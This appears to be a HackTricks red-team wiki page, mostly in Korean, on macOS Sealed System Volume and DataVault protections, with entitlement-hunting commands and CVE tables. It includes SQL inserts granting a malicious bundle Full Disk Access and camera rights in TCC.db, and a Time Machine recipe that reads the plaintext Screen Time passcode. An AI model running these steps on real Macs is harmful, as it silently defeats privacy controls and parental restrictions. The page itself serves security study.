# macOS Sealed System Volume & DataVault

{{#include ../../../banners/hacktricks-training.md}}

## Sealed System Volume (SSV)

### 기본 정보

**macOS Big Sur (11.0)**부터 시스템 볼륨은 **APFS snapshot hash tree**를 사용하여 암호학적으로 봉인됩니다. 이를 **Sealed System Volume (SSV)**이라고 합니다. 시스템 파티션은 **read-only**로 마운트되며, 모든 수정은 봉인을 무효화하고 부팅 중에 검증됩니다.<sup>[[11]](#references)</sup>

SSV는 다음을 제공합니다:
- **변조 탐지** — 시스템 바이너리/framework를 수정하면 Merkle-tree root가 변경되고 Apple이 서명한 봉인이 무효화됩니다.
- **부팅 시 인증** — boot chain은 선택된 시스템 snapshot이 root filesystem이 되기 전에 이를 검증합니다.
- **Rootkit 저항성** — root 권한을 가진 사용자라도 authenticated root를 비활성화하거나 승인된 update path를 손상시키지 않는 한 인증된 시스템 snapshot의 파일을 지속적으로 교체할 수 없습니다.

SSV는 **System** 볼륨을 보호하며, 이 볼륨과 쌍을 이루는 쓰기 가능한 **Data** 볼륨은 보호하지 않습니다. Firmlink는 두 볼륨을 `/`에서 보이는 namespace로 병합하므로, 쓰기 가능한 것처럼 보이는 경로만으로는 해당 underlying object가 봉인된 snapshot에 속한다고 입증할 수 없습니다. FileVault와 Data Protection은 저장 데이터의 confidentiality를 다루며, SSV integrity와는 별개입니다.<sup>[[11]](#references)</sup>

### SSV 상태 확인
```bash
# Check if authenticated root is enabled (SSV seal verification)
csrutil authenticated-root status

# List APFS snapshots (the sealed snapshot is the boot volume)
diskutil apfs listSnapshots disk3s1

# Check mount status (should show read-only)
mount | grep " / "

# Show the volume group and the current Sealed field
diskutil apfs listVolumeGroups
diskutil apfs list | grep -B 8 -A 8 'Sealed:'
```
### Effective system view: SSV + Cryptex grafts

최근 macOS 릴리스에서는 `/System` 아래에 표시되는 모든 실행 파일이 반드시 부팅된 SSV snapshot에서 비롯되는 것은 아닙니다. **Cryptexes**는 별도로 인증된 APFS disk image이며, 해당 콘텐츠가 선택된 디렉터리 위에 graft됩니다. 따라서 Rapid Security Responses는 기본 SSV를 다시 빌드하지 않고도 security-sensitive components를 교체할 수 있습니다. persistence를 triage하거나 system code를 diff할 때는 기본 snapshot만 hashing하지 말고, live mounts와 Preboot Cryptex store를 함께 inventory하십시오:
```bash
mount | grep -Ei 'cryptex|graft'
find /System/Volumes/Preboot/Cryptexes -maxdepth 4 -type d 2>/dev/null
```
부팅 체인과 Rapid Security Response에 관한 세부 내용은 [macOS Architecture — Cryptexes](../mac-os-architecture/README.md#cryptexes-and-rapid-security-responses)에서 다룹니다. 이 섹션에서는 SSV 경계 자체에 중점을 둡니다.

### SSV Writer Entitlements

일부 Apple system binary에는 sealed system volume을 수정하거나 관리할 수 있는 entitlements가 있습니다:

| Entitlement | Purpose |
|---|---|
| `com.apple.private.apfs.revert-to-snapshot` | system volume을 이전 snapshot으로 되돌림 |
| `com.apple.private.apfs.create-sealed-snapshot` | system update 후 새로운 sealed snapshot을 생성 |
| `com.apple.rootless.install.heritable` | SIP-protected path에 쓰기 (child process가 상속) |
| `com.apple.rootless.install` | SIP-protected path에 쓰기 |

### SSV Writers 찾기
```bash
# Search for binaries with SSV-related entitlements
find /System /usr -type f -perm +111 -exec sh -c '
ents=$(codesign -d --entitlements - "{}" 2>&1)
echo "$ents" | grep -q "apfs.revert-to-snapshot\|apfs.create-sealed-snapshot\|rootless.install" && echo "{}"
' \; 2>/dev/null

# Using the scanner database
sqlite3 /tmp/executables.db "
SELECT e.path, c.name
FROM executables e
JOIN executable_capabilities ec ON e.id = ec.executable_id
JOIN capabilities c ON ec.capability_id = c.id
WHERE c.name = 'ssv_writer';"
```
### 공격 시나리오

#### Snapshot Rollback Attack

공격자가 `com.apple.private.apfs.revert-to-snapshot` 권한이 있는 바이너리를 장악하면 **시스템 볼륨을 업데이트 이전 상태로 롤백하여**, 알려진 취약점을 복원할 수 있습니다:
```bash
# Conceptual — the snapshot revert operation would:
# 1. List available snapshots
diskutil apfs listSnapshots disk3s1

# 2. Revert to an older snapshot (requires the entitlement)
# This restores the system to a state with known, patched vulnerabilities
```
> [!WARNING]
> Snapshot rollback은 **security updates를 사실상 취소**하여 이전에 패치된 kernel 및 system vulnerability를 복원합니다. 이는 최신 macOS에서 가능한 가장 위험한 작업 중 하나입니다.

#### System Binary Replacement

SIP bypass + SSV write capability를 사용하면 attacker는 다음을 수행할 수 있습니다.

1. system volume을 read-write로 mount
2. system daemon 또는 framework library를 trojaned version으로 교체
3. snapshot을 다시 seal하거나, SIP가 이미 degraded된 경우 broken seal을 그대로 수용
4. rootkit이 reboot 후에도 지속되며 userland detection tool에는 보이지 않음

### Real-World CVEs

| CVE | Description |
|---|---|
| CVE-2021-30892 | **Shrootless** — `system_installd`의 `com.apple.rootless.install.heritable` entitlement를 악용하여 arbitrary post-install script를 실행하는 SIP bypass ([Microsoft](https://www.microsoft.com/en-us/security/blog/2021/10/28/microsoft-finds-new-macos-vulnerability-shrootless-that-could-bypass-system-integrity-protection/))<sup>[[1]](#references)</sup> |
| CVE-2022-22583 | SIP bypass: `system_installd`가 SIP-protected folder 내부의 `/tmp`에 post-install script를 staging했지만, `/tmp` 자체는 SIP-protected가 아니므로 그 위에 image를 mount하여 folder를 교체할 수 있음 ([Trend Micro](https://www.trendmicro.com/en_us/research/22/l/a-technical-analysis-of-cve-2022-22583-and-cve-2022-32800.html))<sup>[[2]](#references)</sup> |
| CVE-2022-46689 | **MacDirtyCow** — read-only root-owned file에 write를 허용하는 XNU의 copy-on-write race ([Worth Doing Badly](https://worthdoingbadly.com/macdirtycow/))<sup>[[3]](#references)</sup> |

---

## DataVault

### Basic Information

**DataVault**는 sensitive file 및 directory를 보호하는 entitlement-gated filesystem protection입니다. BSD flag `UF_DATAVAULT` (`0x00000080`)는 object를 read 및 write 모두에 entitlement가 필요한 대상으로 표시합니다. 일반적인 DAC와 달리 protection이 적용되는 동안 단순히 **root**가 되거나 Full Disk Access를 부여받는 것만으로는 해당 check를 충족하지 못합니다.<sup>[[4]](#references)[[13]](#references)</sup>

모든 protected database를 “DataVault”의 동의어로 사용해서는 안 됩니다. TCC database는 TCC/FDA 및 SIP-specific policy에 의해 관리되며([macOS TCC](macos-tcc/README.md) 참조), keychain item access 역시 Keychain ACL 및 cryptographic protection에 의존합니다([macOS Keychain](../../macos-red-teaming/macos-keychain.md) 참조). 실제 DataVault 예시는 일반적으로 `/private/var/folders/.../0/` 아래의 service-owned store로 나타나며, 그 예로 Screen Time store가 있습니다. parent를 stat할 수 있는 경우 BSD file flag에서 해당 flag가 `datavault`로 표시됩니다.

### DataVault Controller Entitlements

| Entitlement | Boundary |
|---|---|
| `com.apple.rootless.datavault.controller` | `UF_DATAVAULT` object에 access/manage<sup>[[13]](#references)</sup> |
| `com.apple.private.tcc.manager` | TCC decision을 manage; 이는 관련되어 있지만 별개의 privacy boundary |
| `com.apple.private.tcc.allow` | entitlement value에 지정된 selected TCC service를 bypass |
| `com.apple.rootless.storage.TCC` | SIP-protected TCC store에 write |

DataVault-controller entitlement를 FDA, backup, indexing 또는 IPC functionality와 결합한 process는 특히 흥미롭습니다. vault를 직접 열려고 하기보다는 protected object를 ordinary path로 복사하는 confused-deputy primitive를 찾아야 합니다.<sup>[[14]](#references)</sup>

### Finding DataVault Controllers
```bash
# BSD flags: a protected object is printed with the `datavault` keyword
ls -ldeO@ /private/var/folders/*/*/0/com.apple.ScreenTimeAgent 2>/dev/null
sudo find /private/var/folders -flags +datavault -print 2>/dev/null

# Find Apple binaries carrying DataVault/TCC controller entitlements
find /System /usr -type f -perm +111 -exec sh -c '
ents=$(codesign -d --entitlements - "{}" 2>&1)
echo "$ents" | grep -q "datavault.controller\|private.tcc\|rootless.storage.TCC" && echo "{}"
' \; 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT e.path, c.name
FROM executables e
JOIN executable_capabilities ec ON e.id = ec.executable_id
JOIN capabilities c ON ec.capability_id = c.id
WHERE c.name = 'datavault_controller';"
```
### 공격 시나리오

#### 직접적인 TCC Database 수정 (별도의 TCC 경계)

공격자가 TCC manager process를 침해하면(예: `com.apple.private.tcc.manager`를 보유한 process에 code injection 수행), **TCC database를 직접 수정하여** 모든 application에 원하는 TCC permission을 부여할 수 있습니다:<sup>[[12]](#references)</sup>
```sql
-- Grant Full Disk Access to a malicious binary (conceptual)
INSERT INTO access (service, client, client_type, auth_value, auth_reason, auth_version)
VALUES ('kTCCServiceSystemPolicyAllFiles', 'com.attacker.malware', 0, 2, 4, 1);

-- Grant camera access without a prompt
INSERT INTO access (service, client, client_type, auth_value, auth_reason, auth_version)
VALUES ('kTCCServiceCamera', 'com.attacker.malware', 0, 2, 4, 1);
```
> [!CAUTION]
> TCC database modification은 **ultimate privacy bypass**입니다. 이를 통해 사용자 프롬프트나 눈에 보이는 표시 없이 모든 권한을 조용히 부여할 수 있습니다. 역사적으로 여러 macOS privilege escalation chain은 TCC database write를 최종 payload로 사용했습니다.

#### Keychain Database Access

Keychain backing database에 대한 raw access는 plaintext secret access와 동일하지 않습니다. 다른 privilege boundary를 통해 공격자가 database를 복사할 수 있더라도 key material과 item ACL을 여전히 공격해야 합니다. 따라서 DataVault-controller entitlement만으로 충분하다고 가정하지 말고 전용 [macOS Keychain](../../macos-red-teaming/macos-keychain.md) 페이지를 참조하세요.

#### Backup-copy boundary: Time Machine

2026년 분석에서는 유용한 일반 패턴이 입증되었습니다. `backupd`는 보호된 store를 복사할 수 있도록 `com.apple.rootless.datavault.controller`와 Full Disk Access를 모두 보유합니다. 테스트한 configuration에서는 `/private/var/folders`가 Time Machine에 포함되었으며, mount된 backup copy에는 live DataVault boundary가 적용되지 않았습니다. 연구자는 이를 사용해 Screen Time SQLite store를 찾고 live vault를 열지 않은 채 plaintext restrictions PIN을 읽었습니다. 이를 **copy-boundary attack**으로 간주하세요. 더 약한 mount 또는 path 아래에서 vault data를 materialize할 수 있는 backup, export, migration, indexing, diagnostic deputy를 열거해야 합니다.<sup>[[13]](#references)[[14]](#references)</sup>
```bash
# Confirm the deputy's privileges and whether the source tree is included
codesign -d --entitlements - /System/Library/CoreServices/TimeMachine/backupd 2>&1
tmutil isexcluded /private/var/folders

# Inspect the newest mounted backup; paths vary per host
backup="$(tmutil latestbackup)"
db="$(find "$backup/Data/private/var/folders" -path '*/com.apple.ScreenTimeAgent/Store/RMAdminStore-Local.sqlite' -print -quit 2>/dev/null)"
sqlite3 "$db" 'SELECT ZPASSCODE1 FROM ZCOREORGANIZATIONSETTINGS WHERE ZPASSCODE1 IS NOT NULL LIMIT 1;'
```
이 동작은 버전 및 backup layout에 따라 달라집니다. 대상 build에서 이를 검증하고, 암호화된 Time Machine destination은 잠겨 있는 동안에만 복사본을 보호한다는 점을 기억하세요. 일단 mount되면 해당 access control은 attack surface의 일부가 됩니다.

### DataVault/TCC Bypass가 관련된 실제 CVE

| CVE | 설명 |
|---|---|
| CVE-2024-44131 | 권한 있는 helper가 TCC로 보호되는 데이터에 접근할 수 있도록 하는 FileProvider symlink race ([Jamf](https://www.jamf.com/blog/tcc-bypass-steals-data-from-icloud/))<sup>[[5]](#references)</sup> |
| CVE-2023-40424 | root 권한으로 `NFSHomeDirectory`가 attacker-controlled `TCC.db`를 가리키는 **새 user를 생성**할 수 있습니다. 로그인 시 `tccd`가 이를 사용하고 grant가 적용되어 다른 user의 데이터에 접근할 수 있습니다 ([Kandji](https://blog.kandji.io/malware-bypass-tcc))<sup>[[6]](#references)</sup> |
| CVE-2021-30970 | 사용자의 home dir을 변경하여 attacker-controlled TCC.db를 심는 "powerdir" ([Microsoft](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/))<sup>[[7]](#references)</sup> |
| CVE-2021-30713 | prompt 없이 app이 **donor bundle의 TCC grant를 상속**할 수 있게 하는 bundle-conclusion flaw. 실제 환경에서 **XCSSET**이 이를 악용하여 desktop을 screenshot했습니다 ([Jamf](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/))<sup>[[8]](#references)</sup> |
| CVE-2020-9934 | `tccd`가 `$HOME`에서 DB path를 구성했기 때문에 `launchctl setenv HOME`으로 이를 attacker-controlled `TCC.db`로 redirect할 수 있었습니다 ([Matt Shockley](https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8))<sup>[[9]](#references)</sup> |
| CVE-2020-29621 | `coreaudiod`가 `com.apple.private.tcc.manager`를 **보유하고** library validation도 비활성화했기 때문에 `/Library/Audio/Plug-Ins/HAL`에 배치한 HAL plug-in으로 임의의 TCC 권한을 부여할 수 있었습니다 ([Wojciech Reguła](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/))<sup>[[10]](#references)</sup> |



## References

- [1] [Microsoft가 System Integrity Protection을 우회할 수 있는 새로운 macOS vulnerability인 Shrootless를 발견](https://www.microsoft.com/en-us/security/blog/2021/10/28/microsoft-finds-new-macos-vulnerability-shrootless-that-could-bypass-system-integrity-protection/)
- [2] [Technical Analysis: CVE-2022-22583 - Trend Micro](https://www.trendmicro.com/en_us/research/22/l/a-technical-analysis-of-cve-2022-22583-and-cve-2022-32800.html)
- [3] [MacDirtyCow - 나쁘게 할 만한 가치](https://worthdoingbadly.com/macdirtycow/)
- [4] [Apple Platform Security — Data Protection](https://support.apple.com/guide/security/data-protection-overview-sece3bee0835/web)
- [5] [Jamf Threat Labs - CVE-2024-44131: TCC bypass로 iCloud에서 데이터 탈취](https://www.jamf.com/blog/tcc-bypass-steals-data-from-icloud/)
- [6] [Kandji - macOS Malware 분석: TCC Bypass](https://blog.kandji.io/malware-bypass-tcc)
- [7] [새로운 macOS vulnerability인 "powerdir": unauthorized user data access로 이어질 수 있음](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/)
- [8] [XCSSET malware에서 Zero-Day TCC bypass 발견](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/)
- [9] [CVE-2020–9934: macOS Transparency, Consent, and Control (TCC) Framework Bypass](https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8)
- [10] [음악을 재생하고 TCC bypass, aka CVE-2020-29621](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/)
- [11] [Apple OTA Updates의 악몽 (APFS Snapshots)](https://jhftss.github.io/The-Nightmare-of-Apple-OTA-Update/)
- [12] [Objective-See — TCC Exploitation](https://objective-see.org/blog/blog_0x4C.html)
- [13] [XNU `stat.h` — `UF_DATAVAULT`](https://github.com/apple-oss-distributions/xnu/blob/main/bsd/sys/stat.h)
- [14] [자체 Screen Time passcode를 bypass하는 방법 — source 및 Time Machine/DataVault analysis](https://tangled.org/dunkirk.sh/zera/commit/e6b6236c395e5c9ec1a27ad2a76217d8cc2b4312)
{{#include ../../../banners/hacktricks-training.md}}
